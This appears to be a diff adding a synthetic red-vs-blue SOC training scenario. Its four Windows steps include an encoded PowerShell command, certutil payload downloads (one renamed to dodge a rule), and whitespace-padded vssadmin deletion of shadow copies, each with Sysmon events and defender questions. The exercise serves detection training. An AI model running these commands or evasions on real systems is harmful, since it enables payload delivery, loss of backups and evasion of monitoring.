@@ -1,0 +1,86 @@
+# Red vs blue scenario (roadmap F99). Synthetic telemetry only; see scenarios/README.md.
+id: RVB-03
+title: Living off the land, quietly
+summary: The red team uses known bypasses of the lab's own rules. Blue is expected to lose most steps; that is the
+  point.
+difficulty: hard
+lab_host: WIN-WORKSTATION09
+synthetic: true
+steps:
+- id: RVB-03-S1
+  name: Abbreviated PowerShell parameter
+  technique: T1059.001
+  red: powershell -ec instead of -EncodedCommand (EV-02).
+  blue:
+    expect: missed
+    rules:
+    - SOC-RULE-004
+    question: What would a rule on OriginalFileName and any -e* prefix catch?
+  events:
+  - event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: powershell.exe -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+      ParentImage: C:\Windows\System32\cmd.exe
+    computer_name: WIN-WORKSTATION09
+    timestamp: '2026-11-01T09:07:00Z'
+    technique_id: T1059.001
+- id: RVB-03-S2
+  name: Renamed certutil download
+  technique: T1105
+  red: certutil.exe copied to another name downloads a payload (EV-16).
+  blue:
+    expect: missed
+    rules:
+    - SOC-RULE-014
+    question: Which Sysmon field still identifies the real binary?
+  events:
+  - event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: C:\Users\Public\cu.exe
+      CommandLine: cu.exe -urlcache -split -f http://203.0.113.9/a.bin a.exe
+      ParentImage: C:\Windows\System32\cmd.exe
+      OriginalFileName: CertUtil.exe
+    computer_name: WIN-WORKSTATION09
+    timestamp: '2026-11-01T09:14:00Z'
+    technique_id: T1105
+- id: RVB-03-S3
+  name: Shadow copies, extra space
+  technique: T1490
+  red: vssadmin delete  shadows with two spaces (EV-11).
+  blue:
+    expect: missed
+    rules:
+    - SOC-RULE-019
+    question: How would you normalise whitespace before matching?
+  events:
+  - event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: C:\Windows\System32\vssadmin.exe
+      CommandLine: vssadmin.exe delete  shadows /all /quiet
+      ParentImage: C:\Windows\System32\cmd.exe
+    computer_name: WIN-WORKSTATION09
+    timestamp: '2026-11-01T09:21:00Z'
+    technique_id: T1490
+- id: RVB-03-S4
+  name: Plain certutil download
+  technique: T1105
+  red: Out of patience, the operator uses certutil as-is.
+  blue:
+    expect: detected
+    rules:
+    - SOC-RULE-014
+    question: Which earlier steps does this alert lead you back to?
+  events:
+  - event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: C:\Windows\System32\certutil.exe
+      CommandLine: certutil.exe -urlcache -split -f http://203.0.113.9/a.txt a.exe
+      ParentImage: C:\Windows\System32\cmd.exe
+    computer_name: WIN-WORKSTATION09
+    timestamp: '2026-11-01T09:28:00Z'
+    technique_id: T1105
